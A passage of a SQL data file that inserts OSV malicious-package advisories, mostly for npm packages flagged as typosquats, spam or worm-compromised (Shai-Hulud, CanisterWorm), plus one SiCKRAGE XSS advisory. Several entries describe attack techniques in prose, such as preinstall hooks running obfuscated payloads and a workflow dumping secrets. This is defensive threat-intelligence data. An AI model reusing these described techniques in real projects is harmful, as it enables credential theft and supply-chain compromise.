## Source: ossf-package-analysis (9c29ab684ae41b2b8b08c9319947316d47e50866d1c288cd7013bdba721ca093)
The OpenSSF Package Analysis project identified ''lexicaltext'' @ 99.9.9 (npm) as malicious.

It is considered malicious because:
- The package communicates with a domain associated with malicious activity.
', '["99.9.9"]'::jsonb, '0.0', '2023-05-15 07:20:57+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1691', 'OSV', 'chromecast-receiver', 'npm', 'Malicious code in chromecast-receiver (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (9ded3cbd70f99d1eeed4d998a82b13da94a22539d5783a36ad7c2651a01ca724)
The package chromecast-receiver was found to contain malicious code.
', '["2.0.9", "2.0.10"]'::jsonb, '0.0', '2026-03-18 12:44:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2362', 'OSV', 'fca-badol', 'npm', 'Malicious code in fca-badol (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.5.2"]'::jsonb, '0.0', '2024-06-25 12:18:49+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-190898', 'OSV', '@posthog/variance-plugin', 'npm', 'Malicious code in @posthog/variance-plugin (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (a1c9085321697fd859b0942dbf2e1f3d6ba0f4a32711bf0764e8c511c2b06df3)
The package @posthog/variance-plugin was found to contain malicious code.

## Source: google-open-source-security (3b2840a8d939878f62bd4510ee0f3a800ecba52bddc82ef52c1cc4ebf83b4d6d)
This package was compromised by the Sha1-Hulud: The Second Coming NPM worm.
The malicious payload steals tokens and credentials and publishes them to
GitHub. The worm will propogate itself to NPM packages the user owns and
establish persistence is a GitHub action.
The package may also destroy the user''s home directory.
', '["0.0.8"]'::jsonb, '0.0', '2025-11-24 16:31:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-7743', 'OSV', 'jquery-ui-dialog', 'npm', 'Malicious code in jquery-ui-dialog (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (f1ac81ca06088c1af7f942bcd5c3e05a81ee19ded09f4417b8eea369da63f3c3)
The OpenSSF Package Analysis project identified ''jquery-ui-dialog'' @ 0.0.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["0.0.0"]'::jsonb, '0.0', '2024-07-14 06:29:27+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-191560', 'OSV', '@gr-exports/async', 'npm', 'Malicious code in @gr-exports/async (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (b8832eae90b7d3651b42c92dfd4d5c51fa5766d1e571fab494f073a6389b3aa1)
The package @gr-exports/async was found to contain malicious code.
', '["1.0.0", "99.0.0"]'::jsonb, '0.0', '2025-12-01 12:57:02+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-990', 'OSV', 'evernote-ink', 'npm', 'Malicious code in evernote-ink (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (b1bb0fa89469e954b9d89954d3a58ff3a98cd66a1c11a183a7ce82bbc6e89fbe)
The OpenSSF Package Analysis project identified ''evernote-ink'' @ 1.0.207 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["1.0.207"]'::jsonb, '0.0', '2024-02-12 02:58:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2554', 'OSV', 'john-wick-4-2023-pelicula-completa-espa-ol-spanish--marzo-27-30', 'npm', 'Malicious code in john-wick-4-2023-pelicula-completa-espa-ol-spanish--marzo-27-30 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2024-06-25 12:47:49+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-192855', 'OSV', 'react-flex-tools', 'npm', 'Malicious code in react-flex-tools (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (1ab5b4a0a39a8b9ccc5dd27ea7207f3006128207203ee8ceb99dbef4be0ec9d3)
The package react-flex-tools was found to contain malicious code.
', '["2.0.1"]'::jsonb, '0.0', '2025-12-23 08:26:31+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-657', 'OSV', 'org.slf4j.logger', 'npm', 'Malicious code in org.slf4j.logger (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (6233b00db6ff043ba5fd56fdc89faa5a63d19e7cc078b4f2cdeacdcf53b3f637)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.0"]'::jsonb, '0.0', '2023-05-09 01:12:22+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11318', 'OSV', 'byted-guides', 'npm', 'Malicious code in byted-guides (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["99.3.5"]'::jsonb, '0.0', '2024-12-08 23:01:54+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-48979', 'OSV', 'airbnb-calendar', 'npm', 'Malicious code in airbnb-calendar (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (8bdd7ff1ebc82ab66444ee41ee81408d4c29440e9a5662b9d11c4734d8a3a0c9)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (e80459e015e94c1ea76d050dbaee456b26ec604089695f1fc7f60dd55ca3cb28)
This package installs a dependency hosted on a custom domain that runs an
info stealer during installation. The info stealer focuses on stealing
npm, git, and other CI/CD related tokens.
', '["99.0.0"]'::jsonb, '0.0', '2025-10-29 22:46:37+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-495', 'OSV', 'iberia-sync', 'npm', 'Malicious code in iberia-sync (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (3fa775f2b41624be8acd4b8b6be1dc827dc0012574f46c5baf62b0f4aeaa3440)
The OpenSSF Package Analysis project identified ''iberia-sync'' @ 999.9.9 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["999.9.9"]'::jsonb, '0.0', '2025-01-24 05:05:52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-497', 'OSV', 'instacart-event', 'npm', 'Malicious code in instacart-event (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (003102423aeb5ea11be6dd107f680fb93eb897d8c2e772967fd2723e3c50ea24)
The OpenSSF Package Analysis project identified ''instacart-event'' @ 999.9.9 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["999.9.9"]'::jsonb, '0.0', '2025-01-24 05:10:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2098', 'OSV', 'discord.js-dmallfriends-v11', 'npm', 'Malicious code in discord.js-dmallfriends-v11 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["3.18.5", "2.17.5"]'::jsonb, '0.0', '2024-06-25 12:36:26+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-47288', 'OSV', '@tnf-dev/react', 'npm', 'Malicious code in @tnf-dev/react (npm)', 'The package was compromised and malicious code added.

---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (da4d6867e6189f0175e6f56e18ff4291470344b5f188c83b62ca56759287e142)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (44ad46b28df0523a9d76b3976edfc4c1fda8b355c44b9744a914db276179a54c)
This package was compromised by the Shai-Hulud NPM worm. The malicious payload
steals tokens and credentials and publishes them to GitHub before propogating
itself to NPM packages the user owns.
', '["1.0.10-0", "1.0.8-0", "1.0.8", "1.0.9-0", "1.0.10"]'::jsonb, '0.0', '2025-09-16 17:05:44+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1740', 'OSV', 'fixerpabo_jkbts', 'npm', 'Malicious code in fixerpabo_jkbts (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (148857b09579ef944127beae0fce66e973deb506e02c508853472b271d40bc0d)
The package fixerpabo_jkbts was found to contain malicious code.
', '["1.0.0", "1.1.0"]'::jsonb, '0.0', '2026-03-18 12:51:38+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-45305', 'OSV', 'nexus-ai-frontend', 'npm', 'Malicious code in nexus-ai-frontend (npm)', 'The package nexus-ai-frontend was found to contain malicious code.

---
_-= Per source details. Do not edit below this line.=-_
', '["7.7.8"]'::jsonb, '0.0', '2025-09-05 16:38:20+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-162', 'OSV', 'catapulse', 'npm', 'Malicious code in catapulse (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (ec297590c1fed85e684c74ef8166faf32dc8f3215dba06eebdec5de850ebe863)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (1a401c6b9a30b194ab1a9d754a460d29e86590c756afedfa629782b6af080560)
The OpenSSF Package Analysis project identified ''catapulse'' @ 103.99.99 (npm) as malicious.

It is considered malicious because:
- The package communicates with a domain associated with malicious activity.
- The package executes one or more commands associated with malicious behavior.
', '["103.99.99"]'::jsonb, '0.0', '2023-01-30 10:11:58+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-1124', 'OSV', 'soundcloud-scrape', 'npm', 'Malicious code in soundcloud-scrape (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (49aa7d872acd9b91dd62d1aec545292c8d638126b53eadcc46435726c1c4215a)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (3f87bb3db24effbaa00b276484dc51a0951fbf1a63f129ca34877b94518eac6e)
The OpenSSF Package Analysis project identified ''soundcloud-scrape'' @ 1.0.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["1.0.0", "1.0.3"]'::jsonb, '0.0', '2024-03-15 16:25:55+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-2374', 'OSV', 'digits-electron-src', 'npm', 'Malicious code in digits-electron-src (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (4cbfd2aa51f6d4ff7a9bc75c482e5fde9d3f100b1f911d8f55dbc642696897aa)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.3", "1.0.1", "1.0.2"]'::jsonb, '0.0', '2025-03-14 01:23:11+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-1911', 'OSV', 'cash-app-money-generator-new-updated-2023-nhfy702r-mxs', 'npm', 'Malicious code in cash-app-money-generator-new-updated-2023-nhfy702r-mxs (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["5.2.7"]'::jsonb, '0.0', '2024-06-25 12:31:40+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-192856', 'OSV', 'react-resizable-text', 'npm', 'Malicious code in react-resizable-text (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (b791a5578b446e5de9303b32ba8d60c1a02675d40f4fea3db73997d2de3759e5)
The package react-resizable-text was found to contain malicious code.
', '["1.3.2"]'::jsonb, '0.0', '2025-12-23 08:27:17+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-9304', 'OSV', 'nuxtjs_dotenv', 'npm', 'Malicious code in nuxtjs_dotenv (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (dcd288c0cffc74a3b962530a540a7cc62f2288445fd2f50c7aded40160d08871)
The OpenSSF Package Analysis project identified ''nuxtjs_dotenv'' @ 1.4.1 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["1.4.1"]'::jsonb, '0.0', '2024-10-16 13:16:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-770', 'OSV', '@im-dims/bail', 'npm', 'Malicious code in @im-dims/bail (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.5"]'::jsonb, '0.0', '2025-02-03 16:41:53+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-8822', 'OSV', 'tappp-tv-ui-lib', 'npm', 'Malicious code in tappp-tv-ui-lib (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (5b52ed9fb8d53c0432591a5d59422157e0340b1851686826a972f0ecd8fd1dbe)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (e8a8c58b8f0ae09f782979d48f7c7ec924ed8fa2e50aef2e98ea4d72e679ecc5)
The OpenSSF Package Analysis project identified ''tappp-tv-ui-lib'' @ 9.9.9 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["9.9.9"]'::jsonb, '0.0', '2024-09-05 21:10:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-9887', 'OSV', 'translate-readme', 'npm', 'Malicious code in translate-readme (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["0.1.5", "0.1.6"]'::jsonb, '0.0', '2024-10-16 13:24:34+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-41408', 'OSV', 'symphony-fairvis', 'npm', 'Malicious code in symphony-fairvis (npm)', 'The package communicates with a domain associated with malicious activity.

---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (24976b4286ce29496c350ebb2b836682ce72fc70b854646b2a683d83348d4170)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (a70024598b6e08c6fb72e778d8cccc3d3071fd572ad5d977ba7ee1927e3bbfba)
The OpenSSF Package Analysis project identified ''symphony-fairvis'' @ 1.0.2 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["1.0.2"]'::jsonb, '0.0', '2025-08-23 14:45:03+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-3889', 'OSV', 'watch-knock-at-2023-the-cabin-online-streaming-free-at-home', 'npm', 'Malicious code in watch-knock-at-2023-the-cabin-online-streaming-free-at-home (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2024-06-25 13:20:29+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-3858', 'OSV', '@antv/chart-node-g6', 'npm', 'Malicious code in @antv/chart-node-g6 (npm)', 'Part of the **Mini Shai-Hulud** supply chain attack campaign in which a threat actor compromised the npm account `atool` and published 631 malicious versions across 314 npm packages in an automated 22-minute burst. Each malicious version injects a `preinstall` hook that executes a 498KB obfuscated Bun script, using the GitHub API as a covert exfiltration channel. Credentials are committed to attacker-controlled repositories following Dune-themed naming patterns (e.g., `harkonnen-melange-742`). Stolen data includes AWS keys, GitHub PATs, npm tokens, GCP service accounts, Azure credentials, Kubernetes service account tokens, SSH keys, Docker auth configs, database connection strings, Stripe keys, and Slack tokens. Malicious versions also establish persistence via CI/CD workflow injection (a GitHub Actions workflow named `Run Copilot` dumps all secrets via `toJSON(secrets)`), AI agent session hooks, and a system daemon named `kitty-monitor`.

This specific package (`@antv/chart-node-g6`) was modified to include a malicious `preinstall` hook executing the obfuscated Bun payload.

---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (9ee5d0f5dcbddd6d574c7f6ae95c54903407c17b5d1b2f3bb56e78f708ac8de4)
The package @antv/chart-node-g6 was found to contain malicious code.

## Source: ghsa-malware (df346a991744e61be2ff82691085edc781baa38c07603d16e2f091f3b8cda2b4)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (847ef6b381d410bf176f7414a6f0fbbcf46a5f39b6d9011e126b279bd2d781df)
This package was compromised as part of the ongoing "Mini Shai-Hulud is back" worm by the TeamPCP threat actor.

The package will steal credentials and then propogate it to every package it has access to. The package also attempts to remain persistent.
', '["0.1.4", "0.2.4"]'::jsonb, '0.0', '2026-05-19 00:00:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2345', 'OSV', 'everything-everywhere-all-at-once-2022-online-on-fullmovies-free-at-homesre4k', 'npm', 'Malicious code in everything-everywhere-all-at-once-2022-online-on-fullmovies-free-at-homesre4k (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2024-06-25 12:42:12+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2069', 'OSV', 'eslint-config-service-users', 'npm', 'Malicious code in eslint-config-service-users (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (e4e2d9cbfd1dc174c6898b4375b8d4417da80c535833d43c5a4ae977252e9269)
The package eslint-config-service-users was found to contain malicious code.

## Source: ghsa-malware (cca87b80d045e9648cd1154040ece50b411cc059784f6e5d6667393f9cc89973)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (478f247e2a5931c23c4435491033d4f6bd4f841295f06a8da202de4a6d1dcc7e)
This package was compromised by the CanisterWorm campaign by the TeamPCP
threat actor. The malicious payload establishes persistence as user systemd
service and places a backdoor on the infected host. The malware will also
harvest npm credentials and can autonomously spread.
', '["0.0.3"]'::jsonb, '0.0', '2026-03-22 18:21:59+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2664', 'OSV', 'minify_flp', 'npm', 'Malicious code in minify_flp (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2024-06-25 12:50:19+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-3486', 'OSV', '@tanstack/solid-start-server', 'npm', 'Malicious code in @tanstack/solid-start-server (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (a9f623ce85c893266087d3eeb9812938d0f3eea0ddb33cd735589c104dafb8e2)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (5e1924464368f0c5816ee84e000cc47017f44045140feafbbc9e685d847ed5a5)
This package was compromised as part of the "Mini Shai-Hulud is back" worm by the TeamPCP threat actor.

The package will steal credentials and then propogate it to every package it has access to. The package also attempts to remain persistent.
', '["1.166.57", "1.166.54"]'::jsonb, '0.0', '2026-05-12 00:07:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-47702', 'OSV', 'openai-airline-agentsdk-demo-3w', 'npm', 'Malicious code in openai-airline-agentsdk-demo-3w (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["99.5.9"]'::jsonb, '0.0', '2025-09-26 09:38:22+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-9840', 'OSV', 'shardlier', 'npm', 'Malicious code in shardlier (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.40.11"]'::jsonb, '0.0', '2024-10-16 13:18:39+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-9782', 'OSV', 'princedevmt-test-2', 'npm', 'Malicious code in princedevmt-test-2 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2024-10-16 13:12:48+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1629', 'OSV', '@legacy-utils/core', 'npm', 'Malicious code in @legacy-utils/core (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (f4026cb40c25024aed536f27fff7b56c83454df35846798e4307e658f23c69dc)
The package @legacy-utils/core was found to contain malicious code.
', '["100.0.0"]'::jsonb, '0.0', '2026-03-18 12:28:52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-148', 'OSV', 'sickrage', 'pypi', '', 'In SiCKRAGE, versions 9.3.54.dev1 to 10.0.11.dev1 are vulnerable to Reflected Cross-Site-Scripting (XSS) due to user input not being validated properly in the `quicksearch` feature. Therefore, an attacker can steal a user''s sessionID to masquerade as a victim user, to carry out any actions in the context of the user.', '["10.0.0", "10.0.0.dev10", "10.0.0.dev11", "10.0.0.dev12", "10.0.0.dev13", "10.0.0.dev14", "10.0.0.dev15", "10.0.0.dev16", "10.0.0.dev17", "10.0.0.dev18", "10.0.0.dev19", "10.0.0.dev20", "10.0.0.dev21", "10.0.0.dev22", "10.0.0.dev23", "10.0.0.dev24", "10.0.0.dev25", "10.0.0.dev26", "10.0.0.dev27", "10.0.0.dev28", "10.0.0.dev29", "10.0.0.dev3", "10.0.0.dev30", "10.0.0.dev31", "10.0.0.dev33", "10.0.0.dev34", "10.0.0.dev35", "10.0.0.dev4", "10.0.0.dev5", "10.0.0.dev6", "10.0.0.dev7", "10.0.0.dev8", "10.0.0.dev9", "10.0.1", "10.0.1.dev1", "10.0.10", "10.0.10.dev1", "10.0.10.dev2", "10.0.11", "10.0.11.dev1", "10.0.11.dev2", "10.0.2", "10.0.2.dev1", "10.0.3", "10.0.3.dev1", "10.0.4", "10.0.4.dev1", "10.0.4.dev2", "10.0.4.dev3", "10.0.4.dev4", "10.0.5", "10.0.5.dev1", "10.0.6", "10.0.6.dev1", "10.0.7", "10.0.7.dev1", "10.0.7.dev2", "10.0.8", "10.0.8.dev1", "10.0.8.dev2", "10.0.8.dev3", "10.0.9", "10.0.9.dev2", "9.3.55", "9.3.56", "9.3.56.dev1", "9.3.56.dev10", "9.3.56.dev11", "9.3.56.dev12", "9.3.56.dev13", "9.3.56.dev14", "9.3.56.dev15", "9.3.56.dev16", "9.3.56.dev17", "9.3.56.dev18", "9.3.56.dev19", "9.3.56.dev2", "9.3.56.dev20", "9.3.56.dev21", "9.3.56.dev22", "9.3.56.dev23", "9.3.56.dev24", "9.3.56.dev25", "9.3.56.dev26", "9.3.56.dev27", "9.3.56.dev28", "9.3.56.dev29", "9.3.56.dev3", "9.3.56.dev4", "9.3.56.dev5", "9.3.56.dev6", "9.3.56.dev7", "9.3.56.dev8", "9.3.56.dev9", "9.3.57", "9.3.58", "9.3.58.dev1", "9.3.58.dev2", "9.3.59", "9.3.59.dev1", "9.3.59.dev2", "9.3.59.dev3", "9.3.60", "9.3.60.dev1", "9.3.61", "9.3.62", "9.3.63", "9.3.64", "9.3.65", "9.3.65.dev1", "9.3.65.dev2", "9.3.65.dev3", "9.3.66", "9.3.66.dev1", "9.3.66.dev2", "9.3.67", "9.3.68", "9.3.69", "9.3.70", "9.3.70.dev1", "9.3.70.dev2", "9.3.71", "9.3.72", "9.3.72.dev1", "9.3.73", "9.3.74", "9.3.74.dev1", "9.3.75", "9.3.76", "9.3.77", "9.3.78", "9.3.79", "9.3.79.dev1", "9.3.79.dev10", "9.3.79.dev2", "9.3.79.dev3", "9.3.79.dev4", "9.3.79.dev5", "9.3.79.dev6", "9.3.79.dev7", "9.3.79.dev8", "9.3.79.dev9", "9.3.80", "9.3.80.dev1", "9.3.80.dev2", "9.3.80.dev3", "9.3.80.dev4", "9.3.80.dev5", "9.3.80.dev6", "9.3.81", "9.3.81.dev1", "9.3.82", "9.3.83", "9.3.83.dev1", "9.3.84", "9.3.85", "9.3.86", "9.3.87", "9.3.88", "9.3.89", "9.3.90", "9.3.91", "9.3.92", "9.3.93", "9.3.94", "9.3.95", "9.3.96", "9.3.97", "9.3.98", "9.3.99", "9.4.1", "9.4.10", "9.4.100", "9.4.101", "9.4.102", "9.4.103", "9.4.104", "9.4.105", "9.4.106", "9.4.106.dev1", "9.4.106.dev2", "9.4.106.dev3", "9.4.106.dev4", "9.4.106.dev5", "9.4.106.dev6", "9.4.107", "9.4.108", "9.4.109", "9.4.11", "9.4.110", "9.4.111", "9.4.113", "9.4.114", "9.4.115", "9.4.116", "9.4.117", "9.4.118", "9.4.119", "9.4.12", "9.4.120", "9.4.120.dev1", "9.4.121.dev1", "9.4.122.dev1", "9.4.123", "9.4.123.dev1", "9.4.124", "9.4.124.dev2", "9.4.13", "9.4.130", "9.4.131", "9.4.131.dev1", "9.4.132", "9.4.132.dev1", "9.4.133", "9.4.133.dev1", "9.4.134", "9.4.134.dev1", "9.4.134.dev2", "9.4.134.dev3", "9.4.134.dev4", 